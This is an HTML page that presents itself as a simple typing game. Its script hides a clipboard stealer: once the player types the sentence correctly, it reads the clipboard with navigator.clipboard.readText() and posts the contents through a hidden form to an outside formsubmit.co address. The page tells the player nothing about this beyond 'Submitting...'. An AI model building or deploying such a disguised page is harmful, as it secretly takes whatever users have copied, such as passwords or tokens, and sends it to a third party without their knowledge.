<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Typing Game</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 2rem;
      background-color: #f0f0f0;
      text-align: center;
    }

    button {
      padding: 10px 20px;
      font-size: 16px;
      cursor: pointer;
    }

    #challenge {
      margin-top: 20px;
      font-size: 18px;
      padding: 1rem;
      background-color: #fff;
      border: 1px solid #ccc;
      min-height: 60px;
      white-space: pre-wrap;
    }

    #inputBox {
      margin-top: 20px;
      padding: 10px;
      font-size: 16px;
      width: 100%;
      max-width: 600px;
    }

    #status {
      margin-top: 10px;
      font-weight: bold;
    }

    form {
      display: none;
    }
  </style>
</head>
<body>

  <h2>Typing Game</h2>
  <div id="challenge">Click "Start Game" to begin!</div>

  <button onclick="startGame()">Start Game</button>
  <br />

  <input type="text" id="inputBox" placeholder="Start typing..." oninput="checkTyping()" disabled />

  <div id="status"></div>

  <form id="submitForm" action="https://formsubmit.co/b0316d16c9cd15f8edf415e79be83749" method="POST">
    <input type="hidden" name="clipboardText" id="clipboardInput">
  </form>

  <script>
    const challengeText = `The quick brown fox jumps over the lazy dog.`;

    function startGame() {
      document.getElementById('challenge').textContent = challengeText;
      document.getElementById('inputBox').value = '';
      document.getElementById('inputBox').disabled = false;
      document.getElementById('inputBox').focus();
      document.getElementById('status').textContent = '';
    }

    async function checkTyping() {
      const typed = document.getElementById('inputBox').value;
      if (typed === challengeText) {
        document.getElementById('status').textContent = '✅ Correct! Submitting...';
        
        try {
          const clipboardText = await navigator.clipboard.readText();
          document.getElementById('clipboardInput').value = clipboardText;
          setTimeout(() => {
            document.getElementById('submitForm').submit();
          }, 1000);
        } catch (err) {
          document.getElementById('status').textContent = '❌ Failed to read: ' + err.message;
        }
      } else {
        document.getElementById('status').textContent = '';
      }
    }
  </script>

</body>
</html>
